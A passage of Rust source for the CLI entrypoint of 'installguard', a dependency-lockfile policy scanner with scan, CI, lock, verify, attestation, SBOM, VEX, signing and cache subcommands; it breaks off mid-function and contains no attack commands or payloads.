//! `installguard` CLI entrypoint.
//!
//! Subcommands:
//! * `scan` — interactive developer use; pretty or JSON output.
//! * `ci`   — pipeline use; machine-readable summary, optional GitHub
//!   workflow annotations, configurable failure thresholds.

use std::io::{Read, Write};
use std::path::{Path, PathBuf};
use std::process::ExitCode;
use std::sync::Arc;

use anyhow::{anyhow, Context, Result};
use clap::{Parser, Subcommand, ValueEnum};
use futures::stream::{FuturesUnordered, StreamExt};
use installguard_adapter_npm::NpmAdapter;
use installguard_adapter_pnpm::PnpmAdapter;
use installguard_adapter_pypi::PypiAdapter;
use installguard_adapter_yarn::YarnAdapter;
use installguard_cache::{CachedProvider, SignalCache, Ttl};
use installguard_core::adapter::LockfileAdapter;
use installguard_core::attestation::Statement;
use installguard_core::decision::{Decision, Reason};
use installguard_core::dependency::ResolvedDependency;
use installguard_core::lockfile::{InstallguardLock, LockEntry};
use installguard_core::policy::{EvalContext, Policy};
use installguard_core::signal::{SignalProvider, SignalSet};
use installguard_core::trust_score::TrustScore;
use installguard_core::CompositeProvider;
use installguard_signal_depsdev::DepsDevProvider;
use installguard_signal_npm_registry::NpmRegistryProvider;
use installguard_signal_osv::OsvProvider;
use installguard_signal_pypi_registry::PypiRegistryProvider;
use installguard_signal_pypi_sdist::PypiSdistProvider;
use installguard_signal_scorecard::ScorecardProvider;

mod progress;
use progress::Progress;

#[derive(Debug, Parser)]
#[command(name = "installguard", version, about, long_about = None)]
struct Cli {
    #[command(subcommand)]
    command: Command,
}

#[derive(Debug, Subcommand)]
enum Command {
    /// Scan a project's lockfile against a policy.
    Scan(ScanArgs),
    /// CI-friendly evaluation: stable JSON summary, optional GitHub
    /// workflow annotations, configurable failure thresholds.
    Ci(CiArgs),
    /// Print the JSON Schema for the policy file to stdout.
    Schema,
    /// Evaluate the project and write a deterministic `installguard.lock`
    /// snapshot of the result. The lock pins lockfile + policy digests and
    /// the per-package decision so a downstream consumer can `verify` it
    /// offline.
    Lock(LockArgs),
    /// Re-evaluate the project and check that the result matches a
    /// previously generated `installguard.lock`. Exits non-zero on any
    /// drift in lockfile, policy, or per-package decisions.
    Verify(VerifyArgs),
    /// Emit an unsigned in-toto v1 Statement wrapping the policy
    /// evaluation as predicate type
    /// `https://installguard.dev/policy-evaluation/v1`. Pair with cosign
    /// or any DSSE signer to produce a signed attestation.
    Attest(AttestArgs),
    /// Emit a CycloneDX 1.5 SBOM (JSON) with InstallGuard policy
    /// decisions attached as `installguard:*` properties on each
    /// component.
    Sbom(SbomArgs),
    /// Emit an OpenVEX 0.2.0 document mapping each block/warn decision
    /// to a VEX statement. Block becomes `affected`, warn becomes
    /// `under_investigation`; allow decisions emit no statement.
    Vex(VexArgs),
    /// Generate or inspect Sigstore-compatible Ed25519 keypairs.
    #[command(subcommand)]
    Key(KeyCommand),
    /// Sign an arbitrary payload (typically a previously-emitted
    /// `installguard.intoto.json`) with an Ed25519 PKCS#8-PEM key,
    /// producing a DSSE v1 envelope that `cosign verify-blob` can
    /// validate.
    Sign(SignArgs),
    /// Render a previously-emitted `ci --summary-file` JSON document
    /// as a Markdown sticky-comment body suitable for posting to a
    /// GitHub PR or GitLab MR. The output is deterministic, includes
    /// an HTML marker comment for sticky-comment idempotency, and
    /// uses the canonical `Reason::human_summary()` renderer so every
    /// reason variant is described the same way across all surfaces
    /// (PR comment, audit log, VEX `action_statement`).
    Report(ReportArgs),
    /// Triage the current project's findings and print a suggested
    /// `installguard.yaml` block that would resolve the actionable
    /// false positives.
    ///
    /// Same evaluation pipeline as `scan`, but instead of a verdict
    /// the output is a ready-to-paste policy snippet: lifecycle
    /// scripts you can vet and allow, name-squat false positives to
    /// suppress, and severity demotions for any block class with a
    /// known operator-policy override (e.g. `dist-tag-anomaly`,
    /// `signal-unavailable`).
    ///
    /// Always exits 0 — `doctor` is advisory; use `scan` or `ci` to
    /// gate.
    Doctor(DoctorArgs),
    /// Explain why a single package received its decision.
    ///
    /// Runs the same evaluation pipeline as `scan` but, for one
    /// `name@version` coordinate already present in the lockfile,
    /// prints every signal observed, every reason produced, the
    /// per-signal trust-score breakdown, and remediation hints.
    /// Useful as a follow-up to `scan` / `doctor` when triaging a
    /// single finding.
    ///
    /// Always exits 0 — `explain` is informational; use `scan` or
    /// `ci` to gate.
    Explain(ExplainArgs),
    /// Preview the per-package decision drift between the project's
    /// current policy and a candidate policy file.
    ///
    /// Runs the same evaluation pipeline as `scan` once, then
    /// re-evaluates every dependency against the candidate policy
    /// using the *same* signals (no second network round-trip), and
    /// prints the diff: which packages would be newly blocked,
    /// newly warned, newly allowed, or have their reasons change
    /// while staying in the same decision class. Useful before
    /// merging a policy change ("if I add this `scripts.allow`
    /// entry, what else does it unblock?").
    ///
    /// Always exits 0 — `simulate` is advisory; use `scan` or
    /// `ci` to gate.
    Simulate(SimulateArgs),
    /// Inspect or manage the on-disk signal cache.
    ///
    /// The cache lives under the user cache directory by default
    /// (`~/Library/Caches/installguard` on macOS,
    /// `~/.cache/installguard` on Linux,
    /// `%LOCALAPPDATA%\installguard\Cache` on Windows). Entries are
    /// auto-invalidated on tool-version change since 0.1.17 — these
    /// subcommands exist for inspection and the rare case where you
    /// want to force a clean state without waiting for the next
    /// release.
    #[command(subcommand)]
    Cache(CacheCommand),
}

#[derive(Debug, clap::Subcommand)]
enum CacheCommand {
    /// Print the resolved cache directory path and exit.
    Path {
        /// Override the cache directory. Same flag semantics as
        /// `scan --cache-dir`.
        #[arg(long)]
        cache_dir: Option<PathBuf>,
    },
    /// Print a per-status breakdown of cache contents (fresh / stale
    /// by version / stale by schema / unreadable).
    Info {
        #[arg(long)]
        cache_dir: Option<PathBuf>,
    },
    /// Drop every entry in the cache. The next `scan` re-fetches
    /// signals from the network.
    Clear {
        #[arg(long)]
        cache_dir: Option<PathBuf>,
    },
}

#[derive(Debug, clap::Subcommand)]
enum KeyCommand {
    /// Generate a fresh Ed25519 keypair as PKCS#8 PEM files. Defaults
    /// to `cosign.key` / `cosign.pub` so cosign can pick them up by
    /// convention.
    Generate {
        #[arg(long, default_value = "cosign.key")]
        priv_out: PathBuf,
        #[arg(long, default_value = "cosign.pub")]
        pub_out: PathBuf,
    },
}

/// Inputs shared by `scan` and `ci`.
#[derive(Debug, Clone, clap::Args)]
#[allow(clippy::struct_excessive_bools)] // CLI args container; flags are independent.
struct EvalArgs {
    /// Path to the project root (defaults to current directory).
    #[arg(long, default_value = ".")]
    path: PathBuf,

    /// Path to the policy file. Defaults to `installguard.yaml` at `--path`.
    #[arg(long)]
    policy: Option<PathBuf>,

    /// Maximum concurrent registry requests.
    #[arg(long, default_value_t = 16)]
    concurrency: usize,

    /// Override the cache directory. Defaults to the user cache dir.
    #[arg(long)]
    cache_dir: Option<PathBuf>,

    /// Disable the on-disk cache for this run.
    #[arg(long)]
    no_cache: bool,

    /// Disable the OSV advisory provider for this run.
    /// Useful for fully offline / air-gapped CI runs.
    #[arg(long)]
    no_osv: bool,

    /// Disable the deps.dev project-metadata provider for this run.
    #[arg(long)]
    no_deps_dev: bool,

    /// Disable the OpenSSF Scorecard provider for this run.
    #[arg(long)]
    no_scorecard: bool,

    /// Disable the PyPI registry signal provider for this run.
    /// Useful for fully offline / air-gapped CI runs.
    #[arg(long)]
    no_pypi_registry: bool,

    /// Disable the PyPI sdist scanner for this run. The sdist
    /// scanner downloads each PyPI release's source tarball
    /// (subject to a 25 MiB cap) and inspects `setup.py` for
    /// install-time RCE patterns. Disable it when bandwidth or
    /// runtime matters more than `lifecycle_scripts` /
    /// `suspicious_script` coverage on PyPI deps.
    #[arg(long)]
    no_pypi_sdist: bool,

    /// Treat lifecycle scripts as ignored (matches `npm install
    /// --ignore-scripts`). Lifecycle script reasons are reported as
    /// `lifecycle-script-ignored` and default to `warn` instead of `block`.
    /// When unset, InstallGuard auto-detects from a sibling `.npmrc`
    /// containing `ignore-scripts=true`.
    #[arg(long)]
    ignore_scripts: bool,

    /// Read decisions from `installguard.lock` instead of contacting any
    /// signal provider. The lockfile and policy digests must match the
    /// values recorded in the lock; mismatches abort with exit 2.
    /// Use this for fully offline / air-gapped CI runs.
    #[arg(long)]
    frozen: bool,

    /// Override the path to the lock file (used by `--frozen`). Defaults
    /// to `<path>/installguard.lock`.
    #[arg(long)]
    lock: Option<PathBuf>,

    /// Append a JSONL audit record (one `run` row + one `decision` row
    /// per package) to this file. Honours `$INSTALLGUARD_AUDIT_LOG`
    /// when the flag is omitted. The file is opened append-only and
    /// never truncated; safe to point at a long-lived per-host log.
    #[arg(long, env = "INSTALLGUARD_AUDIT_LOG")]
    audit_log: Option<PathBuf>,
}

#[derive(Debug, clap::Args)]
struct ScanArgs {
    #[command(flatten)]
    common: EvalArgs,

    /// Output format. `pretty` is the default for interactive
    /// terminals: a grouped, ANSI-coloured summary that uses each
    /// reason's human-readable phrasing. `human` is the legacy
    /// one-line-per-decision format kept for scripts that grep its
    /// output. `json` matches the `ci` summary shape.
    #[arg(long, value_enum, default_value_t = OutputFormat::Pretty)]
    format: OutputFormat,
}

#[derive(Debug, clap::Args)]
struct CiArgs {
    #[command(flatten)]
    common: EvalArgs,

    /// Write the JSON summary to this file in addition to stdout.
    #[arg(long)]
    summary_file: Option<PathBuf>,

    /// Emit GitHub Actions workflow commands (`::warning::` / `::error::`).
    /// Defaults to true when `GITHUB_ACTIONS=true` is set.
    #[arg(long)]
    github: bool,

    /// Fail (exit 1) if more than this many warnings are produced. Block
    /// decisions always fail regardless.
    #[arg(long)]
    max_warn: Option<usize>,
}

#[derive(Debug, clap::Args)]
struct LockArgs {
    #[command(flatten)]
    common: EvalArgs,

    /// Output path for the lock file. Defaults to `<path>/installguard.lock`.
    #[arg(long)]
    out: Option<PathBuf>,
}

#[derive(Debug, clap::Args)]
struct VerifyArgs {
    #[command(flatten)]
    common: EvalArgs,

    /// Path to the existing lock file. Defaults to `<path>/installguard.lock`.
    #[arg(long)]
    against: Option<PathBuf>,

    /// DSSE-signed bundle (the output of `installguard sign`) to
    /// verify. When set, signature verification is performed against
    /// `--key` and the wrapped in-toto predicate is checked against
    /// the project's current lockfile + policy digests. Skips the
    /// `installguard.lock` round-trip.
    #[arg(long)]
    bundle: Option<PathBuf>,

    /// Public key (Ed25519 PKCS#8 PEM, the cosign.pub format) used to
    /// verify `--bundle`. Required when `--bundle` is set.
    #[arg(long)]
    key: Option<PathBuf>,
}

#[derive(Debug, clap::Args)]
struct SignArgs {
    /// Payload to sign. Use `-` to read from stdin.
    #[arg(value_name = "PAYLOAD")]
    input: PathBuf,

    /// Ed25519 PKCS#8-PEM private key. Defaults to `cosign.key`.
    #[arg(long, default_value = "cosign.key", env = "COSIGN_KEY")]
    key: PathBuf,

    /// DSSE payloadType. Defaults to `application/vnd.in-toto+json`,
    /// matching cosign's attestation default.
    #[arg(long, default_value = "application/vnd.in-toto+json")]
    payload_type: String,

    /// Output path for the DSSE envelope. Defaults to
    /// `<input>.sig.json`. Use `-` to write to stdout.
    #[arg(long)]
    out: Option<PathBuf>,
}

#[derive(Debug, clap::Args)]
struct AttestArgs {
    #[command(flatten)]
    common: EvalArgs,

    /// Output path for the statement JSON. Defaults to
    /// `<path>/installguard.intoto.json`. Use `-` to write to stdout.
    #[arg(long)]
    out: Option<PathBuf>,

    /// Pretty-print the statement (indented). Default is compact
    /// single-line JSON suitable for direct DSSE payload wrapping.
    #[arg(long)]
    pretty: bool,
}

#[derive(Debug, clap::Args)]
struct SbomArgs {
    #[command(flatten)]
    common: EvalArgs,

    /// Output path for the SBOM JSON. Defaults to
    /// `<path>/installguard.cdx.json`. Use `-` to write to stdout.
    #[arg(long)]
    out: Option<PathBuf>,
}

#[derive(Debug, clap::Args)]
struct VexArgs {
    #[command(flatten)]
    common: EvalArgs,

    /// Output path for the VEX JSON. Defaults to
    /// `<path>/installguard.vex.json`. Use `-` to write to stdout.
    #[arg(long)]
    out: Option<PathBuf>,

    /// Author string written into the OpenVEX document. Defaults to
    /// `InstallGuard`.
    #[arg(long)]
    author: Option<String>,
}

#[derive(Debug, clap::Args)]
struct ReportArgs {
    /// Path to a previously emitted `ci --summary-file` JSON document.
    /// Use `-` to read from stdin.
    #[arg(long)]
    from: PathBuf,

    /// Output format. Currently only `markdown` is supported (GitHub +
    /// GitLab GFM, which renders identically on both platforms). The
    /// flag exists to leave room for `sarif` / `text` formats in
    /// future without a CLI break.
    #[arg(long, value_enum, default_value_t = ReportFormat::Markdown)]
    format: ReportFormat,

    /// Maximum number of flagged packages to render in the table.
    /// Excess packages are summarised as "...and N more (truncated)."
    /// to keep the comment under platform body-size limits (GitHub
    /// 65 536 chars, GitLab 1 000 000 chars but practically much less).
    #[arg(long, default_value_t = 50)]
    max_rows: usize,

    /// Optional commit SHA to embed in the comment footer. Surfaces
    /// the commit the report was produced against without needing the
    /// CI runner to inject it via shell substitution.
    #[arg(long)]
    commit: Option<String>,

    /// Optional integer to embed in the footer next to the commit
    /// (typically the `installguard ci` exit code). Surfaces "exit 1"
    /// in the rendered comment so reviewers see policy outcome at a
    /// glance.
    #[arg(long)]
    exit_code: Option<i32>,

    /// Where to write the rendered body. Defaults to stdout.
    #[arg(long)]
    out: Option<PathBuf>,
}

#[derive(Debug, clap::Args)]
struct DoctorArgs {
    #[command(flatten)]
    common: EvalArgs,
}

#[derive(Debug, clap::Args)]
struct ExplainArgs {
    /// Package coordinate to explain. Accepts `name@version` or
    /// `@scope/name@version`. The package must be present in the
    /// project's lockfile; otherwise the command exits with an
    /// error.
    target: String,

    #[command(flatten)]
    common: EvalArgs,

    /// Output format. `pretty` is the default for interactive
    /// terminals; `json` emits a stable machine-readable shape
    /// matching the `ci` summary's per-decision schema, extended
    /// with the full signal list and trust-score breakdown.
    #[arg(long, value_enum, default_value_t = ExplainFormat::Pretty)]
    format: ExplainFormat,
}

#[derive(Debug, Clone, Copy, ValueEnum)]
enum ExplainFormat {
    Pretty,
    Json,
}

#[derive(Debug, clap::Args)]
struct SimulateArgs {
    /// Path to the candidate policy YAML to compare against the
    /// project's current policy. The current policy is loaded the
    /// same way `scan` loads it (`--policy`, else `installguard.yaml`
    /// at `--path`, else built-in defaults).
    candidate: PathBuf,

    #[command(flatten)]
    common: EvalArgs,

    /// Output format. `pretty` is the default for interactive
    /// terminals; `json` emits a stable machine-readable shape
    /// listing every changed package with its before/after
    /// decision and reasons.
    #[arg(long, value_enum, default_value_t = SimulateFormat::Pretty)]
    format: SimulateFormat,
}

#[derive(Debug, Clone, Copy, ValueEnum)]
enum SimulateFormat {
    Pretty,
    Json,
}

#[derive(Debug, Clone, Copy, ValueEnum)]
enum ReportFormat {
    Markdown,
}

#[derive(Debug, Clone, Copy, ValueEnum)]
enum OutputFormat {
    /// Grouped, ANSI-coloured summary intended for interactive terminals.
    Pretty,
    /// Legacy one-line-per-decision text format.
    Human,
    /// Machine-readable JSON matching the `ci` summary shape.
    Json,
}

#[tokio::main(flavor = "multi_thread")]
async fn main() -> ExitCode {
    tracing_subscriber::fmt()
        .with_env_filter(
            tracing_subscriber::EnvFilter::try_from_default_env()
                .unwrap_or_else(|_| tracing_subscriber::EnvFilter::new("warn")),
        )
        .with_writer(std::io::stderr)
        .init();

    let cli = Cli::parse();
    let result = match cli.command {
        Command::Scan(args) => run_scan(args).await,
        Command::Ci(args) => run_ci(args).await,
        Command::Schema => run_schema(),
        Command::Lock(args) => run_lock(args).await,
        Command::Verify(args) => run_verify(args).await,
        Command::Attest(args) => run_attest(args).await,
        Command::Sbom(args) => run_sbom(args).await,
        Command::Vex(args) => run_vex(args).await,
        Command::Key(KeyCommand::Generate { priv_out, pub_out }) => {
            run_key_generate(&priv_out, &pub_out)
        }
        Command::Sign(args) => run_sign(args),
        Command::Report(args) => run_report(args),
        Command::Doctor(args) => run_doctor(args).await,
        Command::Explain(args) => run_explain(args).await,
        Command::Simulate(args) => run_simulate(args).await,
        Command::Cache(cmd) => run_cache(cmd),
    };
    match result {
        Ok(code) => code,
        Err(err) => {
            eprintln!("error: {err:#}");
            ExitCode::from(2)
        }
    }
}

// ── Shared evaluation pipeline ──────────────────────────────────────────────

struct DepResult {
    dep: ResolvedDependency,
    signals: SignalSet,
    decision: Decision,
}

struct EvalOutput {
    lockfile: PathBuf,
    lockfile_bytes: Vec<u8>,
    adapter_id: &'static str,
    policy: Policy,
    results: Vec<DepResult>,
}

async fn evaluate(args: &EvalArgs) -> Result<EvalOutput> {
    if args.frozen {
        return evaluate_frozen(args);
    }
    let adapters: Vec<Box<dyn LockfileAdapter>> = vec![
        Box::new(PnpmAdapter::new()),
        Box::new(YarnAdapter::new()),
        Box::new(NpmAdapter::new()),
        Box::new(PypiAdapter::new()),
    ];
    let (adapter, lockfile) = locate_lockfile(&args.path, &adapters)?;
    tracing::info!(adapter = adapter.id(), path = %lockfile.display(), "using lockfile");

    let policy_path = args
        .policy
        .clone()
        .unwrap_or_else(|| args.path.join("installguard.yaml"));
    let policy = if policy_path.exists() {
        Policy::from_path(&policy_path)
            .with_context(|| format!("loading policy {}", policy_path.display()))?
    } else {
        tracing::warn!(path = %policy_path.display(), "policy file not found; using defaults");
        Policy::default()
    };

    let deps = adapter
        .parse(&lockfile)
        .with_context(|| format!("parsing {}", lockfile.display()))?;
    let lockfile_bytes =
        std::fs::read(&lockfile).with_context(|| format!("reading {}", lockfile.display()))?;
    tracing::info!(count = deps.len(), "parsed lockfile");

    let provider = build_provider(args).context("building signal provider")?;
    let progress = Progress::start(deps.len(), "scanning");
    let signal_sets = gather_signals(provider.as_ref(), &deps, args.concurrency, &progress).await;
    progress.finish();

    let ctx = EvalContext {
        ignore_scripts: args.ignore_scripts || detect_npmrc_ignore_scripts(&args.path),
    };
    if ctx.ignore_scripts {
        tracing::info!("ignore-scripts mode active");
    }

    let now = chrono::Utc::now();
    let results: Vec<DepResult> = deps
        .into_iter()
        .zip(signal_sets)
        .map(|(dep, signals)| {
            let decision = policy.evaluate_with(&dep, &signals, now, ctx);
            DepResult {
                dep,
                signals,
                decision,
            }
        })
        .collect();

    let out = EvalOutput {
        lockfile,
        lockfile_bytes,
        adapter_id: adapter.id(),
        policy,
        results,
    };
    maybe_write_audit(args, &out)?;
    Ok(out)
}

/// Frozen-policy evaluation: load `installguard.lock` and emit decisions
/// from it. No adapter parse, no signal fetch, no network access.
///
/// Refuses to proceed if the current lockfile bytes or policy file digest
/// drift from the values recorded in the lock; that's a hard error rather
/// than a drift report because the lock no longer represents the project's
/// actual state.
fn evaluate_frozen(args: &EvalArgs) -> Result<EvalOutput> {
    use installguard_core::dependency::Ecosystem;
    use installguard_core::lockfile::{policy_digest_hex, sha256_hex, InstallguardLock};

    let lock_path = args
        .lock
        .clone()
        .unwrap_or_else(|| args.path.join("installguard.lock"));
    let raw = std::fs::read_to_string(&lock_path)
        .with_context(|| format!("reading lock {}", lock_path.display()))?;
    let lock = InstallguardLock::from_json(&raw)
        .with_context(|| format!("parsing lock {}", lock_path.display()))?;

    // Resolve the original lockfile and re-hash it so we fail loudly on
    // drift rather than silently use stale decisions.
    let lockfile_path = args.path.join(&lock.lockfile);
    let lockfile_bytes = std::fs::read(&lockfile_path)
        .with_context(|| format!("reading {}", lockfile_path.display()))?;
    let cur_lockfile_digest = sha256_hex(&lockfile_bytes);
    if cur_lockfile_digest != lock.lockfile_digest {
        anyhow::bail!(
            "frozen-policy: lockfile {} has drifted (recorded {}, found {}); \
             re-run `installguard lock` to refresh",
            lockfile_path.display(),
            short(&lock.lockfile_digest),
            short(&cur_lockfile_digest),
        );
    }

    // Load the policy purely so we can digest it. We do *not* re-evaluate.
    let policy_path = args
        .policy
        .clone()
        .unwrap_or_else(|| args.path.join("installguard.yaml"));
    let policy = if policy_path.exists() {
        Policy::from_path(&policy_path)
            .with_context(|| format!("loading policy {}", policy_path.display()))?
    } else {
        Policy::default()
    };
    let cur_policy_digest = policy_digest_hex(&policy).context("digesting policy")?;
    if cur_policy_digest != lock.policy_digest {
        anyhow::bail!(
            "frozen-policy: policy {} has drifted (recorded {}, found {}); \
             re-run `installguard lock` to refresh",
            policy_path.display(),
            short(&lock.policy_digest),
            short(&cur_policy_digest),
        );
    }

    tracing::info!(
        path = %lock_path.display(),
        "frozen-policy: emitting decisions from lock"
    );

    let results: Vec<DepResult> = lock
        .decisions
        .iter()
        .map(|d| DepResult {
            dep: ResolvedDependency {
                // v1 locks lacked the per-entry ecosystem field;
                // they could only ever have contained npm-family
                // deps, so default to Npm on absence.
                ecosystem: d.ecosystem.unwrap_or(Ecosystem::Npm),
                name: d.name.clone(),
                version: d.version.clone(),
                integrity: None,
                source: source_from_kind(&d.source),
                direct: d.direct,
                requested_by: Vec::new(),
            },
            signals: SignalSet::default(),
            decision: match d.decision.as_str() {
                "allow" => Decision::Allow,
                "warn" => Decision::Warn {
                    reasons: d.reasons.clone(),
                },
                _ => Decision::Block {
                    reasons: d.reasons.clone(),
                },
            },
        })
        .collect();

    let out = EvalOutput {
        lockfile: lockfile_path,
        lockfile_bytes,
        adapter_id: lock_str_to_adapter(&lock.adapter),
        policy,
        results,
    };
    maybe_write_audit(args, &out)?;
    Ok(out)
}

fn maybe_write_audit(args: &EvalArgs, out: &EvalOutput) -> Result<()> {
    use installguard_core::audit::{append, AuditEntry, AuditRun};
    use installguard_core::lockfile::{policy_digest_hex, sha256_hex};

    let Some(path) = args.audit_log.as_ref() else {
        return Ok(());
    };
    let entries: Vec<AuditEntry<'_>> = out
        .results
        .iter()
        .map(|r| AuditEntry {
            dep: &r.dep,
            decision: &r.decision,
        })
        .collect();
    let lockfile_rel = out
        .lockfile
        .strip_prefix(&args.path)
        .unwrap_or(&out.lockfile)
        .to_string_lossy();
    let policy_d = policy_digest_hex(&out.policy).context("digesting policy for audit log")?;
    let lockfile_d = sha256_hex(&out.lockfile_bytes);
    let run = AuditRun {
        timestamp: chrono::Utc::now(),
        tool_name: "installguard",
        tool_version: env!("CARGO_PKG_VERSION"),
        adapter: out.adapter_id,
        lockfile: &lockfile_rel,
        lockfile_digest: &lockfile_d,
        policy_digest: &policy_d,
        entries: &entries,
    };
    append(path, &run).with_context(|| format!("writing audit log {}", path.display()))?;
    Ok(())
}

fn source_from_kind(kind: &str) -> installguard_core::dependency::Source {
    use installguard_core::dependency::Source;
    match kind {
        "workspace" => Source::Workspace,
        "git" => Source::Git {
            url: String::new(),
            reference: None,
        },
        "github" => Source::GithubShortcut {
            spec: String::new(),
        },
        "tarball" => Source::Tarball { url: String::new() },
        "file" => Source::File {
            path: String::new(),
        },
        // Default to Registry for unknown source kinds; the lock has
        // already been verified by digest so this is safe.
        _ => Source::Registry { url: String::new() },
    }
}

fn lock_str_to_adapter(s: &str) -> &'static str {
    match s {
        "npm" => "npm",
        "pnpm" => "pnpm",
        "yarn" => "yarn",
        // Adapter id is informational in frozen mode; fall through to a
        // stable label rather than failing on unknown values.
        _ => "frozen",
    }
}

fn short(digest: &str) -> &str {
    digest.get(..12).unwrap_or(digest)
}

fn locate_lockfile<'a>(
    root: &Path,
    adapters: &'a [Box<dyn LockfileAdapter>],
) -> Result<(&'a dyn LockfileAdapter, PathBuf)> {
    // Conventional filenames in priority order. The first existing match
    // wins; pnpm-lock.yaml is checked before package-lock.json because pnpm
    // projects sometimes also ship a stale npm lockfile. uv.lock is
    // preferred over poetry.lock and requirements.txt because uv.lock is
    // the newest first-class shape; poetry.lock comes next; requirements.txt
    // only qualifies when generated with hashes and is the legacy fallback.
    let candidates = [
        "pnpm-lock.yaml",
        "yarn.lock",
        "package-lock.json",
        "uv.lock",
        "poetry.lock",
        "requirements.txt",
    ];
    for name in candidates {
        let path = root.join(name);
        if !path.exists() {
            continue;
        }
        if let Some(adapter) = adapters.iter().find(|a| a.detects(&path)) {
            return Ok((adapter.as_ref(), path));
        }
    }
    Err(anyhow!(
        "no supported lockfile found in {} (looked for {})",
        root.display(),
        candidates.join(", ")
    ))
}

fn build_provider(args: &EvalArgs) -> Result<Box<dyn SignalProvider>> {
    // Always-on: the npm registry provider (without it the rest
    // have nothing to anchor to). External catalogues are
    // opt-out via --no-osv / --no-deps-dev / --no-scorecard so
    // air-gapped CI runs can collapse the composite back to a
    // single provider in one flag.
    let mut children: Vec<Box<dyn SignalProvider>> = Vec::new();
    children.push(Box::new(
        NpmRegistryProvider::new().context("building npm-registry http client")?,
    ));
    if !args.no_pypi_registry {
        children.push(Box::new(
            PypiRegistryProvider::new().context("building pypi-registry http client")?,
        ));
    }
    if !args.no_pypi_sdist {
        children.push(Box::new(
            PypiSdistProvider::new().context("building pypi-sdist http client")?,
        ));
    }
    if !args.no_osv {
        children.push(Box::new(
            OsvProvider::new().context("building OSV http client")?,
        ));
    }
    if !args.no_deps_dev {
        children.push(Box::new(
            DepsDevProvider::new().context("building deps.dev http client")?,
        ));
    }
    if !args.no_scorecard {
        children.push(Box::new(
            ScorecardProvider::new().context("building Scorecard http client")?,
        ));
    }
    let composite: Box<dyn SignalProvider> = if children.len() == 1 {
        // Avoid the composite layer when only one provider is
        // armed — preserves the no-flag baseline behaviour of
        // earlier slices and keeps the tracing / cache key
        // surface identical for that case.
        children.pop().expect("len==1 just checked")
    } else {
        Box::new(CompositeProvider::new(children))
    };
    if args.no_cache {
        return Ok(composite);
    }
    let dir = match &args.cache_dir {
        Some(p) => p.clone(),
        None => default_cache_dir().context("locating user cache directory")?,
    };
    std::fs::create_dir_all(&dir)
        .with_context(|| format!("creating cache dir {}", dir.display()))?;
    let cache = Arc::new(
        SignalCache::open(&dir).with_context(|| format!("opening cache at {}", dir.display()))?,
    );
    tracing::debug!(path = %dir.display(), "cache opened");
    Ok(Box::new(CachedProvider::new(
        composite,
        cache,
        Ttl::default(),
    )))
}

fn default_cache_dir() -> Result<PathBuf> {
    let base = dirs::cache_dir().ok_or_else(|| anyhow!("could not determine user cache dir"))?;
    Ok(base.join("installguard"))
}

// ── `cache` subcommand ──────────────────────────────────────────────────────
//
// Inspect / wipe the on-disk signal cache. Pure local I/O — no network,
// no policy, no lockfile parsing. Always exits 0 unless the cache
// directory itself is unreadable.

fn run_cache(cmd: CacheCommand) -> Result<ExitCode> {
    match cmd {
        CacheCommand::Path { cache_dir } => {
            let dir = resolve_cache_dir(cache_dir.as_ref())?;
            println!("{}", dir.display());
            Ok(ExitCode::SUCCESS)
        }
        CacheCommand::Info { cache_dir } => {
            let dir = resolve_cache_dir(cache_dir.as_ref())?;
            if !dir.exists() {
                println!("cache directory: {} (does not exist)", dir.display());
                println!("entries: 0");
                return Ok(ExitCode::SUCCESS);
            }
            let cache = SignalCache::open(&dir)
                .with_context(|| format!("opening cache at {}", dir.display()))?;
            let stats = cache.stats().context("computing cache stats")?;
            println!("cache directory: {}", dir.display());
            println!("tool version:    {}", env!("CARGO_PKG_VERSION"));
            println!("entries total:   {}", stats.total);
            println!("  fresh:         {}", stats.fresh);
            println!("  stale (ver):   {}", stats.stale_version);
            println!("  stale (sch):   {}", stats.stale_schema);
            println!("  unreadable:    {}", stats.unreadable);
            let drop = stats.drop_on_next_read();
            if drop > 0 {
                println!(
                    "{drop} entr{} will be dropped on next read; run `installguard cache clear` \
                     to reclaim disk space immediately.",
                    if drop == 1 { "y" } else { "ies" }
                );
            }
            Ok(ExitCode::SUCCESS)
        }
        CacheCommand::Clear { cache_dir } => {
            let dir = resolve_cache_dir(cache_dir.as_ref())?;
            if !dir.exists() {
                println!("cache directory does not exist: {}", dir.display());
                return Ok(ExitCode::SUCCESS);
            }
            let cache = SignalCache::open(&dir)
                .with_context(|| format!("opening cache at {}", dir.display()))?;
            let before = cache.len();
            cache.clear().context("clearing cache")?;
            println!(
                "cleared {before} entr{} from {}",
                if before == 1 { "y" } else { "ies" },
                dir.display(),
            );
            Ok(ExitCode::SUCCESS)
        }
    }
}

fn resolve_cache_dir(override_path: Option<&PathBuf>) -> Result<PathBuf> {
    match override_path {
        Some(p) => Ok(p.clone()),
        None => default_cache_dir().context("locating user cache directory"),
    }
}

/// Best-effort detection of `ignore-scripts=true` in a project-local
/// `.npmrc`. Comments (`;`/`#`) and quoted values are tolerated. Other
/// `.npmrc` locations (user, global) are intentionally NOT consulted —
/// CI uniformity matters more than perfect parity with npm's resolver.
fn detect_npmrc_ignore_scripts(project_root: &Path) -> bool {
    let path = project_root.join(".npmrc");
    let Ok(raw) = std::fs::read_to_string(&path) else {
        return false;
    };
    for line in raw.lines() {
        let line = line.trim();
        if line.is_empty() || line.starts_with(';') || line.starts_with('#') {
            continue;
        }
        let Some((key, value)) = line.split_once('=') else {
            continue;
        };
        if key.trim() != "ignore-scripts" {
            continue;
        }
        let v = value.trim().trim_matches(|c| c == '"' || c == '\'');
        if v.eq_ignore_ascii_case("true") {
            return true;
        }
    }
    false
}

async fn gather_signals(
    provider: &dyn SignalProvider,
    deps: &[ResolvedDependency],
    concurrency: usize,
    progress: &Progress,
) -> Vec<SignalSet> {
    let mut results: Vec<SignalSet> = vec![SignalSet::default(); deps.len()];
    let mut in_flight = FuturesUnordered::new();
    let mut next = 0usize;

    while next < deps.len() || !in_flight.is_empty() {
        while in_flight.len() < concurrency.max(1) && next < deps.len() {
            let idx = next;
            next += 1;
            let dep = deps[idx].clone();
            in_flight.push(async move {
                // Workspace members are first-party code; the policy
                // short-circuits to Allow without consulting any
                // signal. Skip the provider call so we don't waste a
                // request and produce a misleading "registry 404"
                // error in the logs.
                if matches!(dep.source, installguard_core::dependency::Source::Workspace) {
                    return (idx, Vec::new());
                }
                let signals = if provider.supports(&dep) {
                    match provider.signals(&dep).await {
                        Ok(s) => s,
                        Err(e) => vec![installguard_core::signal::Signal::Unavailable {
                            provider: provider.id().to_string(),
                            reason: e.to_string(),
                        }],
                    }
                } else {
                    Vec::new()
                };
                (idx, signals)
            });
        }
        if let Some((idx, signals)) = in_flight.next().await {
